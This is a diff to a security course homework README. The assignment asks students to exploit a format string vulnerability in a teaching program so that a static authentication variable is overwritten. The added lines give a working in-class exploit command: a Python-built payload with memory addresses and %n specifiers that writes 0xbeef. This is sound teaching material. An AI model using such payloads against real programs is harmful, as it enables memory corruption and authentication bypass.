@@ -6,6 +6,10 @@ Due date: 11:59pm, 2/15/2019
 
 In this project, you will leverage a format string vulnerability in the program `fmt_vuln`. The program prints out whatever is provided by the user in the argument via `printf`. A static variable in the program `test_val` controls the authentication process. Only if you can overwrite `test_val` with `0xdeadbeef` can you successfully go through authentication, in which case the program prints "you win!"
 
+Below is the script we used in class that successfull writes "0xbeef".
+
+> ./fmt_vuln `python -c 'print("\x30\xa0\x04\x08"+"JUNK" + "\x31\xa0\x04\x08" + "%08x."*9+"%146x%n" + "%207x%n")'`
+
 This homework accounts for **5 points**.
 
 ## **Bonus**
